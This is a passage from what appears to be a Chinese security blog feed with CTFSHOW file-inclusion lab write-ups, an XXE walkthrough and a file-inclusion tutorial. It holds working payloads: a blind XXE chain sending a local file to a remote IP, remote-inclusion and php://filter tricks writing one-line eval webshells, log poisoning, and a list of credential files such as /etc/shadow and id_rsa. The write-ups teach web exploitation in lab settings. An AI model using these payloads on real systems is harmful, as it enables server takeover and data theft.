src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666489034-6ca58ebd-f5be-4cba-9405-cfecac72d3c7.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666489123-c1fd8f77-4fad-4a3b-a14d-3e795c3796d7.png"></p><p>先尝试读取文件，无回显后带外测试：</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666489123-3f659ae6-d9be-4ec7-b2b9-765660754c9d.png"></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://1uwlwv.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666489210-639657a3-2c36-4c1e-b6fc-395e7d14fc63.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733666489286-b2660cc6-d0e2-4779-9bff-34632dcac97d.png"></p><p>存在XXE漏洞</p><p>然后带外传递数据解决无回显：</p><p>payload：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://47.94.236.117/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>get.php：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">$data=$_GET[&#x27;file&#x27;];</span></span><br><span class="line"><span class="meta">$myfile = fopen(&quot;file.txt&quot;, &quot;w+&quot;);</span></span><br><span class="line"><span class="meta">fwrite($myfile, $data);</span></span><br><span class="line"><span class="meta">fclose($myfile);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Java安全-XXE注入-Reader-Builder"><a href="#Java安全-XXE注入-Reader-Builder" class="headerlink" title="Java安全-XXE注入-Reader&amp;Builder"></a>Java安全-XXE注入-Reader&amp;Builder</h1><h2 id="白盒-1"><a href="#白盒-1" class="headerlink" title="白盒"></a>白盒</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 审计的函数</span><br><span class="line"> * 1. XMLReader</span><br><span class="line"> * 2. SAXReader</span><br><span class="line"> * 3. DocumentBuilder</span><br><span class="line"> * 4. XMLStreamReader</span><br><span class="line"> * 5. SAXBuilder</span><br><span class="line"> * 6. SAXParser</span><br><span class="line"> * 7. SAXSource</span><br><span class="line"> * 8. TransformerFactory</span><br><span class="line"> * 9. SAXTransformerFactory</span><br><span class="line"> * 10. SchemaFactory</span><br><span class="line"> * 11. Unmarshaller</span><br><span class="line"> * 12. XPathExpression</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含Lab-CTFSHOW</title>
      <link href="/2025/05/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABLab-CTFSHOW/"/>
      <url>/2025/05/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABLab-CTFSHOW/</url>
      
        <content type="html"><![CDATA[<h1 id="78-php-http协议"><a href="#78-php-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732542770747-f01dcac9-55a2-41f4-8bee-5400fbf3d05c.png"></p><blockquote><p>GET传参，参数为file，没有过滤，直接包含</p></blockquote><h2 id="解法一（filter）"><a href="#解法一（filter）" class="headerlink" title="解法一（filter）"></a>解法一（filter）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732542842647-10bc6d34-236f-451e-ba7b-4c8a52af21fb.png"></p><p>得到一串base64，解码之后则为flag.php的内容</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732542878861-874279d9-51e6-4afc-a325-ba4a2e6d9270.png"></p><h2 id="解法二（input）"><a href="#解法二（input）" class="headerlink" title="解法二（input）"></a>解法二（input）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: </span><br><span class="line">?file=php://input post:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">?file=php://input post:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;//tac和cat都可以</span><br></pre></td></tr></table></figure><p>使用input，post里执行php代码，系统命令</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732542955345-12fa2c67-f12b-4147-95f9-b3f73bc72ef5.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732543107241-b7491542-eeed-45fe-b4e9-6980e43ae4dd.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732543119722-45e2729e-8e1d-4253-8926-fa289e2ee2a5.png"></p><h2 id="解法三（远程文件包含-传shell）"><a href="#解法三（远程文件包含-传shell）" class="headerlink" title="解法三（远程文件包含 传shell）"></a>解法三（远程文件包含 传shell）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?file=http://47.99.124.145/1.txt </span><br><span class="line">远程1.txt: &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; </span><br></pre></td></tr></table></figure><blockquote><p>在服务器上创建一个1.txt，内容为一句话木马，使用file访问1.txt，解析一句话木马，连接shell</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732543533573-e664faf6-efc2-4e9b-853f-c394fa6ef177.png"></p><h1 id="79-data-http协议"><a href="#79-data-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732543607343-e987cb2e-bf70-412e-a209-cc1a4f694afa.png"></p><blockquote><p>php被过滤为？？？，无法绕过，选择不使用php，使用data:&#x2F;&#x2F;</p></blockquote><h2 id="解法一（data）"><a href="#解法一（data）" class="headerlink" title="解法一（data）"></a>解法一（data）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,&lt;?=system(&#x27;tac fl*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>php被过滤了，这里的<?php system('');?>要写成<?=system('');?></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733668306183-0af40e9d-b8eb-4394-9669-07a1d9c7e8b2.png"></p><h2 id="解法二（data-base64）"><a href="#解法二（data-base64）" class="headerlink" title="解法二（data-base64）"></a>解法二（data-base64）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>先将后面的base64值改为<?php system('ls');?>的base64值，传参执行，在将base64的值改为<?php system('tac flag.php');?></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732544576855-efa54b91-ce0b-46cd-87e2-d799d1992e4a.png"></p><h2 id="解法三（远程文件包含-传shell）-1"><a href="#解法三（远程文件包含-传shell）-1" class="headerlink" title="解法三（远程文件包含 传shell）"></a>解法三（远程文件包含 传shell）</h2><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://47.99.124.145/1.txt </span><br></pre></td></tr></table></figure><p>1.txt：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733668708074-7f9b4cac-f0dc-4553-8292-1cc6f175d8ce.png"></p><h1 id="80-日志包含"><a href="#80-日志包含" class="headerlink" title="80-日志包含"></a>80-日志包含</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733668880885-63ac1997-ac50-4420-9edb-6e3e8c3b24cf.png"></p><p>过滤php，data关键字</p><blockquote><p>ctfshow是nginx服务，日志文件目录&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733669147920-3422c512-4ac6-423e-842d-19f63d559b79.png"></p></blockquote><h2 id="解法一（包含日志文件）"><a href="#解法一（包含日志文件）" class="headerlink" title="解法一（包含日志文件）"></a>解法一（包含日志文件）</h2><p>日志文件包含ua信息，我们在ua中插入一句话木马</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733669611300-ad320d8f-c5e3-467f-aafc-7672b7f00ebb.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733669590448-239a4e89-2ffb-42d0-b6ab-1742a8701a22.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733669645853-86ce88eb-5193-492e-84ee-f6610e599ac1.png"></p><h2 id="解法二（远程文件包含）"><a href="#解法二（远程文件包含）" class="headerlink" title="解法二（远程文件包含）"></a>解法二（远程文件包含）</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733669832948-445a3840-579c-4fc8-90da-5f8f085920c4.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733669824274-1fe2d5fc-5053-4d7b-8482-3c583ccce269.png"></p><h1 id="81-日志包含"><a href="#81-日志包含" class="headerlink" title="81-日志包含"></a>81-日志包含</h1><p>过滤php、data、:</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733669928330-1f138777-b10b-4a4d-a177-f0da1074f48a.png"></p><h2 id="解法一（包含日志文件）-1"><a href="#解法一（包含日志文件）-1" class="headerlink" title="解法一（包含日志文件）"></a>解法一（包含日志文件）</h2><p>包含日志文件可以直接包含马，也可以执行命令</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733670255412-e1689b64-95ac-4a75-914f-cf83800e3a94.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733670377345-ebbbf33d-78ac-43f4-b70a-a734a7a34180.png"></p><h1 id="87-php-filter-write-加密编码"><a href="#87-php-filter-write-加密编码" class="headerlink" title="87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码"></a>87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733670754862-f99f1e66-4a03-47ff-9f0a-bc795f6755b5.png"></p><p>分析：</p><p>file：GET传参</p><p>content：POST传参</p><p>过滤php、data、:、.</p><p>file_put_contents文件写入（并且进行一次url解码）</p><p>绕过die</p><h2 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h2><p>我们file传参使用php:&#x2F;&#x2F;filter，在进行url编码</p><p>content传参写入ROT13编码后的一句话木马</p><p>payload：（要对payload进行二次URL全编码）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=shell.php</span><br></pre></td></tr></table></figure><p>Nodepad++可以进行URL全编码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733705363570-a1f8228a-872b-441d-af1d-9f861480807a.png"></p><p>两次URL全编码后Payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%37%33%25%36%38%25%36%35%25%36%43%25%36%43%25%32%45%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure><p>content：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?cuc riny($_CBFG[&#x27;cnff&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733707146121-1d313b53-0fb8-4e69-b6b8-29e1edd46b94.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733707216518-d8be1aa8-c856-449a-9a03-f206d21b4611.png"></p><p>shell.php一句话木马成功写入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733707253169-e84e26f0-9b33-428c-b0a2-e7d43422e641.png"></p><blockquote><p>还可以使用php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;test.php</p><?php eval($_POST['pass']);?><p>payload：</p><p>?file&#xp><p>content:aaPD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4&#x3D;</p><p>（前面两个a是因为不加a会报错，字节流不符合）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733707550127-3e38d51c-c659-4890-b600-1323fa59ad90.png"></p></blockquote><h1 id="88-data-base64协议"><a href="#88-data-base64协议" class="headerlink" title="88-data&amp;base64协议"></a>88-data&amp;base64协议</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733672045559-ae70cc14-22ad-43b6-9368-448dc0b82f45.png"></p><p>过滤了很多字符，没有过滤data，使用data-base64绕过</p><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>由于直接构造base64编码后也有被过滤的字符，所以我们添加无用字符，使构造后的base64中不含有被过滤字符</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733672645694-b48e549f-fab7-4de0-8b40-0f6ce10cb465.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733672670676-cb1602e2-4664-473d-b996-1caed292aca0.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733672709049-74a6a6e5-e0e0-4b06-b9e6-79ad823f89eb.png"></p><h1 id="116-misc-文件包含"><a href="#116-misc-文件包含" class="headerlink" title="116-misc+文件包含"></a>116-misc+文件包含</h1><p>打开是一个mp4文件，下载</p><p>放入随波逐流</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733673721750-47ba18b5-23a1-4900-97c0-275a72672f56.png"></p><p>binwalk发现有一个png</p><p>foremost分离出png</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733673789048-28a7da02-0dff-48ea-ad23-ade1212cba22.png"></p><p>file参数，GET传参</p><p>过滤了很多关键字，但是有file_get_contents函数读取文件，我们直接传参</p><p>?file&#x3D;flag.php</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733674035466-d4d4b886-2b49-441d-b975-f3a6f89b00f5.png"></p><h1 id="117-php-filter-write-iconv-UCS-2LE-UCS-2BE"><a href="#117-php-filter-write-iconv-UCS-2LE-UCS-2BE" class="headerlink" title="117-php:&#x2F;&#x2F;filter&#x2F;write-iconv.UCS-2LE.UCS-2BE"></a>117-php:&#x2F;&#x2F;filter&#x2F;write-iconv.UCS-2LE.UCS-2BE</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733674242989-af35b042-b446-46aa-97f3-ab923c5f42c7.png"></p><p>最后的结果是将<?php die();?>和contents的内容写入file</p><p>过滤了rot13、base64等，我们使用其他过滤器</p><p>绕过死亡die</p><p>我们使用convert.iconv过滤器，将正常的die代码转变为不正常的代码，将我们输入的不正常的代码转换为正常代码</p><p>php脚本：（用来生成content值）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$result = iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, &#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);</span><br><span class="line">echo &quot;经过一次反转:&quot;.$result.&quot;\n&quot;;</span><br><span class="line">echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, $result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733708262696-fb3fd9fb-8e34-4b62-aee4-c7136ce5c6ac.png"></p><p>类似于rot13，经过两次反转之后可以变为原来的内容，因此我们将第一次反转的值写入content，这样在通过filter再写入文件会进行第二次反转，最后写入文件的内容还是<?php eval($_POST[a]);?>，经过第二次反转之后die函数也被破坏，从而绕过die</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br><span class="line">contents：?&lt;hp pvela$(P_SO[T]a;)&gt;?</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733708643304-c97cf75c-136d-4e50-8f03-9b30bbf56486.png"></p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2025/05/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2025/05/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>为了使代码更灵活，开发人员将可重复使用的函数写入单个文件，使用这些函数时，直接调用该文件即可，这种调用过程被称为文件包含，通常被包含的文件被设置为变量，用来进行动态调用，因此可能导致客户端可以调用一个任意文件，造成文件包含漏洞，能够将包含的文件（不限格式后缀）以脚本方式运行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php include &quot;xx.xx&quot;;?&gt; 这种是包含指定页面，不存在文件包含漏洞</span><br><span class="line">&lt;?php include $_GET[x];?&gt; 这种通过动态变量的传参才存在文件包含漏洞</span><br></pre></td></tr></table></figure><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ol><li>文件读取</li></ol><p>可以包含一个服务器配置文件或者网站配置文件从而读取到该文件的内容（文件内容不符合php语法，直接打印文件内容）</p><ol start="2"><li>获取服务器权限</li></ol><p>如果被包含的文件符合php语法，就会将该文件当成php文件解析执行，不管文件后缀是什么</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><ol><li>本地文件包含-Local File Include-LFI</li></ol><p>包含存放在目标服务器本地的文件</p><ol start="2"><li>远程文件包含-Remote File Include-RFI</li></ol><p>包含存放在攻击者服务器的文件</p><h1 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP：include、require、include_once、require_once等</span><br><span class="line">include 找不到被包含的文件还能执行脚本，只会弹出警告</span><br><span class="line">require 找不到被包含文件，整个脚本都不能执行</span><br><span class="line"></span><br><span class="line">Java：java.io.File、java.io.FileReader等</span><br><span class="line"></span><br><span class="line">ASP.NET：System.IO.FileStream、System.IO.StreamReader等</span><br></pre></td></tr></table></figure><ol><li>include</li><li>include_once</li><li>require</li><li>require_once</li></ol><blockquote><p>作用都是用来包含文件，</p><p>include：没有包含到文件时，后面的代码还会被执行</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720767105879-1807e62d-524b-47d4-9c8b-a0f9151ad4f2.png"><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720767113713-9d072bcc-1af9-49f2-8a20-6ea53bbedc15.png"></p><p>require：没有包含到文件时，后面的代码不会被执行</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720767182559-26c45fe0-46ff-4dcd-af43-d46ca3f80a9f.png"></p><p>加上once的话，就是不管代码中有几个文件包含的函数，只包含一次文件</p></blockquote><h1 id="黑白盒思路"><a href="#黑白盒思路" class="headerlink" title="黑白盒思路"></a>黑白盒思路</h1><p>白盒发现：</p><p>1、可通过应用功能追踪代码定位审计</p><p>2、可通过脚本特定函数搜索定位审计</p><p>3、可通过伪协议玩法绕过相关修复等</p><p>黑盒发现：主要观察参数传递的数据和文件名是否对应，</p><p>URL中有path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼（在传参）</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><blockquote><p>一般都是用于读取敏感信息，或者是配合文件上传可以有更大危害</p></blockquote><p>存在文件上传：</p><p>1、配合文件上传(目标有上传点，自己上传一个恶意代码的文件)</p><blockquote><p>包含图片马（文件上传）</p></blockquote><p>不存在文件上传：</p><p>2、包含日志</p><p>3、包含SESSION</p><p>4、支持伪协议利用</p><blockquote><p>包含系统敏感文件</p><p>包含日志文件</p><p>利用php伪协议进行攻击</p></blockquote><h3 id="文件读取的几种方式"><a href="#文件读取的几种方式" class="headerlink" title="文件读取的几种方式"></a>文件读取的几种方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式一：</span><br><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526406825-300e57de-53d8-41c8-b67e-5e83c2392184.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式二：</span><br><span class="line">php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526447698-61e8191d-e5ec-4e83-bfda-7b7c68fac039.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526453861-41297731-6436-4ad3-bf2b-d834bcc8b7a7.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526467940-365ffd07-a19c-44f8-94fe-f9acbef2d3e9.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526472262-737516fe-165d-4bde-9620-f75e284f302f.png"></p><h3 id="文件写入几种方式"><a href="#文件写入几种方式" class="headerlink" title="文件写入几种方式"></a>文件写入几种方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式一：</span><br><span class="line">php://filter/write=convert.base64-encode/resource=phpinfo.php  //这个需要代码里有两个参数才行</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526604376-9552644a-7e4c-4f66-9a03-93b7fadac4ce.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526624093-3b1eea6a-fab8-4c4f-ab9a-7df9e3876bc6.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526632824-55b2a8ba-9db7-40c0-918a-4545a357dacb.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式二：</span><br><span class="line">php://input </span><br><span class="line">POST:&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526656702-6e1ed047-82f9-43aa-b20a-f3630a64a9b0.png"></p><h3 id="代码执行几种方式"><a href="#代码执行几种方式" class="headerlink" title="代码执行几种方式"></a>代码执行几种方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式一：</span><br><span class="line">php://input </span><br><span class="line">POST:&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526687077-47bd4384-9500-4b1d-978b-e8aa0e3fcbf4.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式二：</span><br><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526722553-f2ff6829-0104-4386-bf35-c30e3c050a8a.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式三：</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732526766604-65d9a7b9-087b-4662-adf2-9fd69a53dac3.png"></p><h3 id="包含系统敏感文件"><a href="#包含系统敏感文件" class="headerlink" title="包含系统敏感文件"></a>包含系统敏感文件</h3><ol><li>windows常见文件</li></ol><table><thead><tr><th>文件</th><th>说明</th></tr></thead><tbody><tr><td>C:\boot.ini</td><td>查看系统版本</td></tr><tr><td>C:\Windows\System32\inetsrv\MetaBase.xml</td><td>IIS配置文件</td></tr><tr><td>C:\Windows\repair\sam</td><td>存储系统初次安装的密码</td></tr><tr><td>C:\Program Files\mysql\my.ini</td><td>Mysql配置</td></tr><tr><td>C:\Program Files\mysql\data\mysql\user.MYD</td><td>Mysql root密码</td></tr><tr><td>C:\Windows\php.ini</td><td>php配置信息</td></tr><tr><td>C:\Windows\my.ini</td><td>Mysql配置信息</td></tr><tr><td>C:\Windows\win.ini</td><td>Windows系统的一个基本系统配置文件</td></tr></tbody></table><ol start="2"><li>linux常见敏感文件</li></ol><table><thead><tr><th>文件</th><th>说明</th></tr></thead><tbody><tr><td>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</td><td></td></tr><tr><td>&#x2F;root&#x2F;.ssh&#x2F;id_rsa</td><td></td></tr><tr><td>&#x2F;root&#x2F;.ssh&#x2F;id_ras.keystore</td><td></td></tr><tr><td>&#x2F;root&#x2F;.ssh&#x2F;known_hosts</td><td>记录每个访问计算机用户的公钥</td></tr><tr><td>&#x2F;etc&#x2F;passwd</td><td></td></tr><tr><td>&#x2F;etc&#x2F;shadow</td><td></td></tr><tr><td>&#x2F;etc&#x2F;my.conf</td><td>mysql配置文件</td></tr><tr><td>&#x2F;etc&#x2F;php&#x2F;5.6&#x2F;apache2&#x2F;php.ini</td><td>php配置文件</td></tr><tr><td>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</td><td>apache配置文件</td></tr><tr><td>&#x2F;root&#x2F;.bash_history</td><td>用户历史命令记录文件</td></tr><tr><td>&#x2F;root&#x2F;.mysql_history</td><td>mysql历史命令记录文件</td></tr><tr><td>&#x2F;proc&#x2F;mounts</td><td>记录系统挂载设备</td></tr><tr><td>&#x2F;porc&#x2F;config.gz</td><td>内核配置文件</td></tr><tr><td>&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db</td><td>全文件路径</td></tr><tr><td>&#x2F;porc&#x2F;self&#x2F;cmdline</td><td>当前进程的cmdline参数</td></tr></tbody></table><p>利用：</p><p>如果url里如下，大概率存在文件包含漏洞</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720768344070-3240d551-a506-4ea6-b47f-de0429264819.png"></p><p>我们修改page&#x3D;后面的参数（改为敏感文件）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1720768431442-717c79d1-25cf-4f47-b28f-6c10d37e5e9e.png"></p><p>观察页面回显</p><p>可以对文件进行爆破</p><p>可以多加几个..&#x2F;从而跳转到根目录（无论加再多个..&#x2F;，最总都是跳转到根目录）</p><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" 